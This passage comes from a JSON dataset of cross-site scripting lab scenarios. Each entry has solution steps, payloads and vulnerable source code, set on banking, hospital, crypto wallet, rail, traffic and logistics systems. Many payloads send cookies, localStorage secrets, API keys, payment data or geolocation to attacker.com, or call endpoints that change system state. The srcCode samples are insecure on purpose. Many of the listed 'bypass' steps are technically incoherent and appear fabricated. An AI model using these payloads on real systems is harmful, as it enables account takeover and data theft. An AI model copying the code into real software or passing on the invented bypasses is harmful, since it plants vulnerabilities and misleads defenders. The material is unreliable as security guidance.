      "3. Exploit parser state confusion between markdown and HTML contexts",
      "4. Trigger through message quote/reply functionality"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      ":warning:`'><svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>",
      "\\`\\`\\`html\n<svg><!--</code>--><script>alert(1)</script>\\`\\`\\`"
    ],
    "srcCode": "function renderMessage(text) {\n  return text\n    .replace(/:([\\w-]+):/g, '<img src=\"emoji/$1.png\">')\n    .replace(/`([^`]+)`/g, '<code>$1</code>');\n}"
  },
  {
    "Lab scenario": "DOM XSS in AI-Powered Chatbot Financial Advisor",
    "Lab Description": "A robo-advisor platform reflects user risk profiles in D3.js visualizations. The application uses <foreignObject> to embed unsanitized LLM responses in SVG charts. To solve: Inject XSS through crafted investment goals that execute during portfolio simulation.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Intercept WebSocket message with OWASP ZAP",
      "Craft payload: {\"goal\":\"<iframe srcdoc='<script>parent.alert(1)</script>'\"}",
      "Bypass CSP using d3-annotation plugin vulnerabilities",
      "Trigger through risk assessment PDF export"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<foreignObject><template shadowroot><script>alert('PORTFOLIO')</script>",
      "{\"profile\":\"Conservative<script>new Image().src='//attacker.com?data='+localStorage.secrets</script>\"}"
    ],
    "srcCode": "socket.on('update', data => {\n  d3.select('#chart').html(`<svg>${data.goal}</svg>`);\n});"
  },
  {
    "Lab scenario": "Stored XSS in Encrypted Chat Message Metadata",
    "Lab Description": "An E2EE messaging app stores message timestamps in IndexedDB without validation. The React frontend decrypts and renders location metadata using dangerouslySetInnerHTML. To solve: Inject XSS through crafted GPS coordinates that execute during map pin hover.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify Signal Protocol encrypted payload: lat=0&long=0&note=<script>alert('CHAT_DB')</script>",
      "Bypass WebCrypto validation using IV manipulation",
      "Exploit Mapbox GL popup rendering vulnerabilities",
      "Trigger through message expiration animations"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"location\":\"0,0<img src=x onerror='navigator.clipboard.readText()'>\"}",
      "<details ontoggle=alert(1) open></details>"
    ],
    "srcCode": "const decrypted = await crypto.subtle.decrypt(key, encrypted);\ndocument.getElementById('meta').innerHTML = decoder.decode(decrypted);"
  },
  {
    "Lab scenario": "DOM XSS in Voice Banking IVR Transcript Viewer",
    "Lab Description": "A phone banking system converts voice call transcripts to HTML using insecure Web Speech API output. The application renders timestamps with innerHTML without escaping angle brackets. To solve: Inject XSS through spoken phrases that execute when agents review call recordings.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Say payload during IVR: \"My account number is <svg/onload='fetch(`/api/balance`).then(r=>r.text()).then(d=>new Image().src=`http://attacker.com?data=${d}`)'>\"",
      "Bypass audio-to-text homoglyph filtering using pitch modulation",
      "Exploit Web Audio API AnalyserNode visualization",
      "Trigger through call quality assurance reviews"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "Account\\u0020number\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
      "<audio src=x onerror=alert(1)>"
    ],
    "srcCode": "speechRecognition.onresult = e => {\n  const transcript = e.results[0][0].transcript;\n  document.getElementById('call-text').innerHTML = transcript;\n};"
  },
  {
    "Lab scenario": "Stored XSS in Cryptocurrency Wallet Recovery Phrase Grid",
    "Lab Description": "A hardware wallet management portal stores BIP-39 mnemonics as SVG grids in IPFS. The React frontend dangerously renders seed phrase visualizations. To solve: Inject XSS through crafted word positions that execute during backup verification.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Modify seed.json: {\"words\":[\"apple\",\"<svg/onload='navigator.usb.requestDevice({filters:[]})'>\",\"chair\"]}",
      "Bypass BIP-39 checksum validation using entropy padding",
      "Exploit Three.js InstancedMesh matrix synchronization",
      "Trigger through paper wallet PDF generation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"grid\":\"<foreignObject><template shadowroot><script>alert('SEED_PWN')</script>\"}",
      "<image xlink:href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='/>"
    ],
    "srcCode": "wallet.on('load', () => {\n  ReactDOM.render(<SVGWrapper content={wallet.seedGrid} />, root);\n});"
  },
  {
    "Lab scenario": "Mutation XSS in AI Mortgage Calculator Chatbot",
    "Lab Description": "A home loan platform's chatbot parses natural language income statements into HTML tables. The application's Markdown-to-LaTeX converter fails to handle matrix environments. To solve: Inject XSS through salary descriptions that bypass PDF sanitization.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send message: \"My income is $\\begin{bmatrix}<script>alert('PREAPPROVAL')</script>\\end{bmatrix}$\",",
      "Bypass KaTeX sanitizer using \newenvironment hooks",
      "Exploit Puppeteer PDF rendering race conditions",
      "Trigger through automated pre-approval emails"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "\\begin{tabular}{|c|}\\hline<script>alert(1)</script>\\\\ \\end{tabular}",
      "$$\\pi = 3.14<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>$$"
    ],
    "srcCode": "function renderChatToPDF(text) {\n  const html = marked.parse(text);\n  return pdf.create(html); // Vulnerable HTML-to-PDF conversion\n}"
  },
  {
    "Lab scenario": "DOM XSS in Stock Trading Signal Webhook Preview",
    "Lab Description": "A algo-trading platform reflects unsanitized webhook JSON data in TradingView charts. The application uses Angular's bypassSecurityTrustHtml for strategy annotations. To solve: Inject XSS through crafted alert messages that execute during backtest rendering.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Configure webhook: {\"message\":\"<iframe srcdoc='<script>parent.alert(1)</script>'\"}",
      "Bypass TV JS API sandbox using postMessage handler injection",
      "Exploit Pine Script strategy.entry() label rendering",
      "Trigger through historical volatility simulations"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"signal\":\"BUY<script>new Image().src='http://attacker.com?key='+localStorage.apiKey</script>\"}",
      "<math><maction actiontype='statusline#xss'>alert(1)</maction>"
    ],
    "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${webhookData}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
  },
  {
    "Lab scenario": "Stored XSS in Blockchain Smart Contract Event Logs",
    "Lab Description": "A DeFi analytics platform renders Ethereum event logs as HTML using web3.js. The application parses contract ABIs without sanitizing indexed parameters. To solve: Inject XSS through malicious event emissions that execute when users filter transactions.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Deploy contract with event: emit Transfer(address(0), \"<svg/onload='alert(`DAO_DRAIN`)'>\"",
      "Bypass Solidity ABI encoding validation using tuple nesting",
      "Exploit The Graph subgraph visualization vulnerabilities",
      "Trigger through token holder CSV exports"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "event Transfer(address indexed from, string calldata memo);\n// Memo: </script><svg/onload='alert(1)'>",
      "{\"logs\":[{\"topics\":[\"0x3c7363726970743e616c6572742831293c2f7363726970743e\"]}]}"
    ],
    "srcCode": "contract.on('Transfer', (from, to, memo) => {\n  document.getElementById('tx-list').innerHTML += `<div>${memo}</div>`;\n});"
  },
  {
    "Lab scenario": "DOM XSS in Product Review Carousel",
    "Lab Description": "An online marketplace renders user reviews in a React carousel using dangerouslySetInnerHTML. The application converts Markdown comments to HTML without sanitizing <details> tags. To solve: Inject XSS that triggers when shoppers expand review details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept review submission with Burp Suite",
      "Craft payload: `Rating: 5/5 <details ontoggle=alert('CART_HIJACK') open>`",
      "Bypass CSP using AngularJS ng-include directive",
      "Trigger through mobile app's infinite scroll"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<img src='x' onerror='navigator.sendBeacon(\"https://attacker.com\", localStorage.paymentData)'>",
      "<details open ontoggle=\"fetch('/api/cart?delete=true')\">"
    ],
    "srcCode": "function Review({ text }) {\n  return <div dangerouslySetInnerHTML={{ __html: marked.parse(text) }} />;\n}"
  },
  {
    "Lab scenario": "Stored XSS in Loyalty Point Calculator",
    "Lab Description": "A retail chain's CRM stores customer tier calculations in PostgreSQL with disabled pg_escape_string. The Vue frontend renders loyalty status using v-html. To solve: Inject XSS through crafted purchase history that executes during point redemption.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use Postman to send payload: {\"purchases\":\"<iframe srcdoc='<script>parent.alert(1)</script>'\"}",
      "Bypass GraphQL input validation using alias injection",
      "Exploit Highcharts tooltip rendering vulnerabilities",
      "Trigger through birthday reward emails"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"history\":\"</textarea><script>alert('LOYALTY_OVERRIDE')</script>\"}",
      "<svg viewBox=\"0 0 100 100\" xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script>"
    ],
    "srcCode": "app.post('/loyalty', async (req, res) => {\n  await pool.query('INSERT INTO purchases VALUES ($1)', [req.body.history]);\n});"
  },
  {
    "Lab scenario": "Mutation XSS in AR Virtual Try-On",
    "Lab Description": "A fashion app's WebGL-based virtual mirror parses JSON accessory metadata without HTML entity encoding. The application converts product SKUs to tooltips using innerHTML. To solve: Craft SKU containing XSS that executes when users share looks.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Modify product feed: {\"sku\":\"DRESS-3Cscript3Ealert(1)\", ...}",
      "Bypass 3D model validation using Babylon.js texture injection",
      "Exploit WebXR anchor point synchronization",
      "Trigger through social media sharing"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"id\":\"TSHIRT-<script>alert('TRYON_DATA')</script>\"}",
      "<model><body onload=\"document.write('<iframe src=attacker.com>')\"/>"
    ],
    "srcCode": "gltfLoader.load(modelUrl, (gltf) => {\n  document.getElementById('tooltip').innerHTML = gltf.userData.sku;\n});"
  },
  {
    "Lab scenario": "DOM XSS in Flash Sale Countdown Timer",
    "Lab Description": "A deal site's Next.js timer component reflects URL parameters in its SVG-based countdown. The application uses date-fns without escaping timezone abbreviations. To solve: Inject XSS through crafted tz parameter during daylight saving transitions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify URL: ?tz=EST<svg/onload='fetch(\"/api/coupons?apply=all\")'>",
      "Bypass Intl.DateTimeFormat validation using legacy TZ aliases",
      "Exploit requestIdleCallback timing attacks",
      "Trigger through email reminder links"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "?tz=GMT+<script>document.write('<img src=//attacker.com?c='+document.cookie)>",
      "<animate attributeName=\"opacity\" values=\"1; <script>alert(1)</script>\" dur=\"1s\"/>"
    ],
    "srcCode": "export default function Timer({ params }) {\n  return <div dangerouslySetInnerHTML={{ __html: format(params.tz) }} />;\n}"
  },
  {
    "Lab scenario": "Stored XSS in Supply Chain Inventory API",
    "Lab Description": "A warehouse management system stores stock codes in MongoDB without input validation. The Angular frontend renders pallet locations using [innerHTML]. To solve: Inject XSS through RFID tag data that executes during stock takes.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Spoof RFID tags with payload: STOCK-<script>alert('SUPPLY_CHAIN')</script>",
      "Bypass EPC Gen2 encoding checks using TID memory banks",
      "Exploit AGV robot path visualization",
      "Trigger through cold chain monitoring alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"location\":\"Aisle 3 <img src=x onerror='new AudioContext().createScriptProcessor()'>\"}",
      "<math><maction actiontype=\"statusline#xss\">alert(1)</maction>"
    ],
    "srcCode": "this.http.get('/stock').subscribe(res => {\n  this.inventory = this.sanitizer.bypassSecurityTrustHtml(res.data);\n});"
  },
  {
    "Lab scenario": "DOM XSS in Patient Portal Lab Results Viewer",
    "Lab Description": "A hospital EHR system renders PDF lab reports as HTML using pdf-lib without proper sanitization. The application converts PDF annotations to DOM elements using innerHTML. To solve: Inject XSS through crafted lab comments that execute when doctors view results.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use PDFKit to create malicious annotation: /Contents (<script>alert('PHI_LEAK')</script>)",
      "Bypass PDF/A-3 validation using incremental updates",
      "Exploit Mozilla pdf.js rendering vulnerabilities",
      "Trigger through multi-provider consults"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "BT /F1 12 Tf 0 Tc 0 Tw ( <script>navigator.sendBeacon('https://attacker.com', document.body.innerHTML)</script> ) Tj ET",
      "<</Type/Annot/Subtype/Text/Contents(<iframe/src=javascript:alert(1)>>"
    ],
    "srcCode": "pdfDoc.getAnnotations().then(annots => {\n  document.getElementById('comments').innerHTML = annots.map(a => a.contents);\n});"
  },
  {
    "Lab scenario": "Stored XSS in MRI Machine Scheduling System",
    "Lab Description": "A radiology workflow manager stores DICOM metadata in MariaDB with disabled input escaping. The Angular frontend renders patient preparation instructions using [innerHTML]. To solve: Inject XSS through crafted scan protocols that persist across modality worklist updates.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Modify MWL request: (0040,0275) <svg/onload='fetch(\"/api/scanners?force_recalibrate=true\")'>",
      "Bypass DICOM VR validation using multi-frame injection",
      "Exploit OpenLayers ROI annotation rendering",
      "Trigger through contrast agent alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "(0010,0010) PN [<script>alert('PATIENT_SWAP')</script>]",
      "<style>@keyframes x{}</style><div style=\"animation-name:x\" onanimationstart=\"alert(1)\">"
    ],
    "srcCode": "app.post('/mwl', (req, res) => {\n  pool.query('INSERT INTO schedule VALUES ?', [req.body]);\n});\n// Client:\n<div [innerHTML]=\"protocol\"></div>"
  },
  {
    "Lab scenario": "Mutation XSS in Telemedicine Video Chat",
    "Lab Description": "A telehealth platform converts WebRTC data channel messages to HTML using a flawed Markdown parser. The application's emoji shortcode processor allows nested code blocks. To solve: Craft message that bypasses :emoji: syntax to execute script during session recording.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send chat: :warning:`'><svg/onload='alert(\"DIAGNOSIS_EDIT\")'>",
      "Bypass DOMPurify using SVG foreignObject injection",
      "Exploit MediaRecorder API timestamp synchronization",
      "Trigger through transcript export"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      ":pill: <xmp><plaintext><img src=x onerror=alert(1)>",
      "\\`\\`\\`html\n<svg><!--</code>--><script>alert(1)</script>\\`\\`\\`"
    ],
    "srcCode": "function parseMessage(text) {\n  return text\n    .replace(/:([\\w-]+):/g, '<img src=\"emoji/$1.png\">')\n    .replace(/`([^`]+)`/g, '<code>$1</code>');\n}"
  },
  {
    "Lab scenario": "DOM XSS in Smart Pill Dispenser Mobile App",
    "Lab Description": "An IoT medication manager renders dosage schedules in React Native WebView without escaping. The application converts NFC tag payloads to HTML using dangerouslySetInnerHTML. To solve: Program NFC tags with XSS that executes when caregivers scan the device.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Proxmark3 to write NFC tag: <iframe srcdoc='<script>parent.alert(1)</script>'",
      "Bypass NDEF Type Name Format validation using empty TNF",
      "Exploit React Native postMessage handler vulnerabilities",
      "Trigger through low-stock alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "NDEF Record: TNF=0, PAYLOAD=<script>navigator.bluetooth.requestDevice()</script>",
      "<math><maction actiontype=\"statusline#xss\">alert('DOSE_OVERRIDE')</maction>"
    ],
    "srcCode": "NfcManager.registerTagEvent(tag => {\n  WebView.injectJavaScript(`document.body.innerHTML += '${tag.ndefMessage}'`);\n});"
  },
  {
    "Lab scenario": "Stored XSS in Genomic Data Visualization Portal",
    "Lab Description": "A precision medicine platform stores VCF files in HDFS without sanitizing INFO fields. The Vue frontend renders variant annotations using v-html. To solve: Inject XSS through crafted genetic markers that execute during cohort analysis.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Modify VCF: INFO=<ID=XSS,Number=1,Type=String,Description=\"<script>alert('DNA_DATA')</script>\"",
      "Bypass GA4GH schema validation using reserved INFO keys",
      "Exploit BioJS 3D protein viewer tooltips",
      "Trigger through pharmacogenomic reports"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "##INFO=<ID=CSQ,Number=.,Type=String,Description=\"<svg/onload='alert(1)'>\"",
      "chr1\t100\t.\tA\tT\t100\tPASS\tXSS=<iframe/src=javascript:alert(1)>"
    ],
    "srcCode": "vcfParser.parse(file).then(data => {\n  this.annotations = data.metadata.info;\n});\n// Template:\n<div v-html=\"annotations.XSS\"></div>"
  },
  {
    "Lab scenario": "DOM XSS in Adaptive Traffic Light Control API",
    "Lab Description": "A smart traffic system's web interface reflects intersection IDs from URL parameters in Three.js visualizations. The application converts SCATS protocol data to SVG without sanitizing phase timing values. To solve: Inject XSS through crafted phase parameter that executes during emergency vehicle preemption.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Intercept API request: GET /intersection?id=0<script>alert('GRIDLOCK')</script>",
      "Bypass NTCIP 1202 validation using VISSIM simulation data",
      "Exploit OpenGL shader error handling",
      "Trigger through pedestrian crossing activation"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "?id=0<svg xmlns='http://www.w3.org/2000/svg' onload='fetch(\"/api/lights?state=red\")'>",
      "{\"phase\":\"3 <math><maction actiontype='statusline#xss'>alert(1)</maction>\"}"
    ],
    "srcCode": "app.get('/intersection', (req, res) => {\n  res.render('view', { id: req.query.id });\n});\n// Client:\ndocument.getElementById('signal').innerHTML = id;"
  },
  {
    "Lab scenario": "Stored XSS in Smart Waste Bin Fill-Level Dashboard",
    "Lab Description": "A municipal waste management system stores ultrasonic sensor data in InfluxDB without input validation. The React frontend renders bin status using dangerouslySetInnerHTML in D3.js heatmaps. To solve: Inject XSS through spoofed MQTT payloads that trigger during collection route optimization.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use Node-RED to inject: {\"fill\":\"80%<iframe srcdoc='<script>parent.alert(1)</script>'\"}",
      "Bypass LoRaWAN payload encryption using OTAA key leakage",
      "Exploit Leaflet.heat gradient rendering vulnerabilities",
      "Trigger through predictive maintenance alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"bin_id\":\"TRUCK-<script>navigator.geolocation.getCurrentPosition(e=>fetch('https://attacker.com?loc='+e.coords)</script>\"}",
      "<image xlink:href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='/>"
    ],
    "srcCode": "mqttClient.on('message', (topic, message) => {\n  ReactDOM.render(<BinStatus data={message} />, root);\n});"
  },
  {
    "Lab scenario": "Mutation XSS in Water Quality Sensor XML Feed",
    "Lab Description": "A smart water grid parses OGC SensorThings API responses into HTML tables. The application's XML parser fails to handle namespaces in SWE Common data arrays. To solve: Craft malicious sensor observation containing XSS that executes during flood prediction modeling.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Modify observation: <swe:values>3Cscript3Ealert('CONTAMINATION')</swe:values>",
      "Bypass WaterML 2.0 schema validation using escaped CDATA",
      "Exploit CesiumJS info box rendering",
      "Trigger through EPA compliance reports"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<om:result xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(1)</html:script>",
      "<!--<script>--><svg/onload=alert(1)>"
    ],
    "srcCode": "xmlParser.parseString(data, (err, result) => {\n  document.getElementById('readings').innerHTML = result.toString();\n});"
  },
  {
    "Lab scenario": "DOM XSS in Public Transit Real-Time Map",
    "Lab Description": "A bus tracking system reflects unsanitized vehicle IDs from GTFS-RT feeds in Mapbox GL popups. The application uses Angular's bypassSecurityTrustHtml for passenger load indicators. To solve: Inject XSS through crafted vehicle positions that execute during route deviation alerts.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Spoof GPS feed: {\"vehicle\":\"VH-<svg/onload='fetch(`/api/vehicles?command=stop`)'/>\"}",
      "Bypass GTFS trip_update validation using timestamp rollbacks",
      "Exploit Turf.js buffer calculation vulnerabilities",
      "Trigger through paratransit booking integrations"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"id\":\"BUS12<script>new Image().src='http://attacker.com?data='+localStorage.schedules</script>\"}",
      "<math><maction actiontype=\"statusline#xss\">alert('ROUTE_HIJACK')</maction>"
    ],
    "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${vehicle.status}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
  },
  {
    "Lab scenario": "Stored XSS in Emergency Response Chat Logs",
    "Lab Description": "A city's crisis management system stores responder messages in Elasticsearch without escaping. The Vue frontend renders incident timelines using v-html. To solve: Inject XSS through crafted triage codes that execute during mutual aid requests.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Send payload: {\"code\":\"CODE-<script>alert('EVAC_ORDER')</script>\"}",
      "Bypass CAP protocol validation using polygon geofence wrapping",
      "Exploit ArcGIS API for JavaScript popup vulnerabilities",
      "Trigger through Everbridge integration alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"incident\":\"</textarea><script>alert('CBRN_LEAK')</script>\"}",
      "<details open ontoggle=\"navigator.mediaDevices.getUserMedia({video:true})\">"
    ],
    "srcCode": "app.post('/incidents', (req, res) => {\n  elasticClient.index({ index: 'alerts', body: req.body });\n});\n// Client:\n<div v-html=\"incident.code\"></div>"
  },
  {
    "Lab scenario": "DOM XSS in Autonomous Truck Platooning API",
    "Lab Description": "A freight management system reflects unsanitized truck IDs from V2V (Vehicle-to-Vehicle) messages in Angular visualizations. The application converts SAE J1939 data to SVG without escaping. To solve: Inject XSS through crafted vehicle spacing parameters that execute during platoon formation.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Intercept DSRC (Dedicated Short-Range Communications) messages using GNU Radio",
      "Craft payload: {\"truck_id\":\"<svg/onload='fetch(`/api/platoons?disband=true`)'>\"}",
      "Bypass AASHTO validation using false GNSS timestamps",
      "Trigger through emergency braking simulations"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "truck=TR-<script>document.write('<iframe src=attacker.com>')</script>",
      "<math><maction actiontype='statusline#xss'>alert('PLATOON_HIJACK')</maction>"
    ],
    "srcCode": "this.sanitizer.bypassSecurityTrustHtml(`<div>${truckData}</div>`);\n// Template:\n<div [innerHTML]=\"trustedHtml\"></div>"
  },
  {
    "Lab scenario": "Stored XSS in Maritime Container Tracking System",
    "Lab Description": "A global shipping portal stores ISO 6346 container codes in MongoDB without input validation. The Vue frontend renders cargo manifests using v-html. To solve: Inject XSS through malicious BIC codes that execute during customs clearance workflows.",
    "Difficulty Level": "High",
    "Solution Steps": [
      "Use Postman to send payload: {\"container\":\"MSKU<script>alert('CARGO_THEFT')</script>\"}",
      "Bypass SOLAS verification using checksum spoofing",
      "Exploit Leaflet.markercluster plugin vulnerabilities",
      "Trigger through hazardous material alerts"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"bic\":\"TGHU\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}",
      "<img src='x' onerror='navigator.geolocation.watchPosition(p=>fetch(`http://attacker.com?lat=${p.coords.latitude}`))'>"
    ],
    "srcCode": "app.post('/containers', (req, res) => {\n  db.collection('cargo').insertOne(req.body);\n});\n// Client:\n<div v-html=\"container.bic\"></div>"
  },
  {
    "Lab scenario": "Mutation XSS in Drone Delivery Waypoint Planner",
    "Lab Description": "A last-mile delivery system parses GeoJSON waypoints into CesiumJS maps without proper sanitization. The application's XML-to-HTML converter fails to handle KML namespace injections. To solve: Craft malicious flight path containing XSS that executes during FAA airspace checks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload payload: <kml><Document><name><![CDATA[</name><svg/onload=alert('NO_FLY_ZONE')>]]>",
      "Bypass DJI FlySafe validation using altitude wrapping",
      "Exploit Three.js glTF model metadata injection",
      "Trigger through battery level warnings"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "<Placemark><name><script>alert(1)</script></name></Placemark>",
      "{\"coordinates\":\"-118.25,34.05<iframe srcdoc='<script>parent.alert(1)</script>'\"}"
    ],
    "srcCode": "kmlParser.parse(file, (err, result) => {\n  document.getElementById('map').innerHTML = result;\n});"
  },
  {
    "Lab scenario": "DOM XSS in Railway Signaling Asset Management",
    "Lab Description": "A rail network monitoring tool reflects unsanitized track circuit IDs from IEC 62290 telemetry in React dashboards. The application uses dangerouslySetInnerHTML for failure alerts. To solve: Inject XSS through crafted balise parameters that execute during train detection events.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept GSM-R messages using Software Defined Radio",
      "Craft payload: {\"balise_id\":\"BAL-<svg/onload='fetch(\"/api/signals?aspect=red\")'>\"}",
      "Bypass ERTMS/ETCS packet validation using CRC32 collisions",
      "Trigger through axle counter resets"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"track\":\"SNCF-<script>alert('SIGNAL_OVERRIDE')</script>\"}",
      "<details open ontoggle=\"navigator.credentials.get({otp: true})\">"
    ],
    "srcCode": "function Signal({ data }) {\n  return <div dangerouslySetInnerHTML={{ __html: data }} />;\n}"
  },
  {
    "Lab scenario": "Stored XSS in Warehouse Robot Pathfinding Interface",
    "Lab Description": "An automated fulfillment system stores AMR (Autonomous Mobile Robot) grid maps in PostgreSQL with disabled escaping. The Angular frontend renders SLAM trajectories using [innerHTML]. To solve: Inject XSS through malicious navigation waypoints that execute during inventory cycle counts.",
    "Difficulty Level": "Critical",
    "Solution Steps": [
      "Modify ROS navigation_stack parameters: <param name=\"costmap\" value=\"<script>alert('INVENTORY_SABOTAGE')</script>\"",
      "Bypass OMPL motion planning validation using NaN injections",
      "Exploit RViz visualization vulnerabilities",
      "Trigger through picker workstation integrations"
    ],
    "Vulnerability name": "Cross-site scripting",
    "payloads": [
      "{\"waypoint\":\"Aisle-<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'>\"}",
      "<image xlink:href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='/>"
    ],
    "srcCode": "this.http.get('/amr').subscribe(res => {\n  this.grid = this.sanitizer.bypassSecurityTrustHtml(res.data);\n});"
  },
  {
    "Lab scenario": "Online Support Chat Stored XSS in Message Content",
    "Lab Description": "The support chat system stores user-submitted messages and reflects them using innerHTML in the agent interface. The application doesn't sanitize content before rendering. To solve: Inject a script in the message and trigger execution in the agent view.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the /chat endpoint and send a message with XSS payload.",
      "View the stored message in /agent interface.",
      "Inspect the DOM to confirm innerHTML is used.",
      "Confirm the payload executes in the agent's browser.",
      "Verify control over agent\u00e2\u20ac\u2122s session or DOM."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(document.domain)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const messages = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/chat', (req, res) => { messages.push(req.body.msg); res.redirect('/chat'); }); app.get('/chat', (req, res) => { res.send(`<form method='POST'><input name='msg'><button>Send</button></form>`); }); app.get('/agent', (req, res) => { const output = messages.map(m => `<div>${m}</div>`).join(''); res.send(`<html><body>${output}</body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Event Scheduler Reflected XSS in Title Field",
    "Lab Description": "The event scheduler reflects the 'title' parameter in a JavaScript block that sets page content. The application directly inserts the title value into a JS string using double quotes. To solve: Escape the context and execute arbitrary JavaScript.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Navigate to /event?title= and test payload reflection.",
      "Check the page source for the script tag usage.",
      "Confirm title is injected inside a quoted string.",
      "Craft a payload using quotes or semicolons.",
      "Trigger alert to validate execution."
    ],
    "payloads": [
      "\";alert('XSS');//",
      "';alert(1);//",
      "`;alert(document.domain)//"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const app = express(); app.get('/event', (req, res) => { const title = req.query.title || 'My Event'; res.send(`<html><head><script>var t = \"${title}\";</script></head><body></body></html>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Bug Tracker Stored XSS in Issue Description",
    "Lab Description": "The bug tracker stores submitted issue descriptions and renders them using innerHTML in the issue detail page. No sanitization is performed. To solve: Submit a script payload in the description and view the issue to trigger XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Submit a bug report via /report with an XSS payload in the description.",
      "Open the issue detail via /issue?id=1.",
      "Inspect how the description is rendered using innerHTML.",
      "Trigger payload execution in browser.",
      "Confirm that JavaScript executes in the page context."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<iframe src='javascript:alert(1)'>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const issues = []; app.use(bodyParser.urlencoded({ extended: true })); app.post('/report', (req, res) => { issues.push({ desc: req.body.description }); res.redirect('/issue?id=1'); }); app.get('/issue', (req, res) => { const issue = issues[0]; res.send(`<div id='desc'></div><script>document.getElementById('desc').innerHTML = \"${issue.desc}\";</script>`); }); app.listen(3000);"
  },
  {
    "Lab scenario": "Search History Dashboard DOM XSS via Previous Queries",
    "Lab Description": "The dashboard fetches and displays past search queries using JavaScript by injecting each query into the DOM using innerHTML. To solve: Inject a malicious query that executes script when reflected.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send a query with an XSS payload via /search?q=.",
      "Go to /dashboard to see stored queries.",
      "Inspect how queries are rendered in the DOM.",
      "Confirm innerHTML usage for rendering.",
      "Trigger script execution from injected payload."
    ],
    "payloads": [
      "<script>alert(1)</script>",
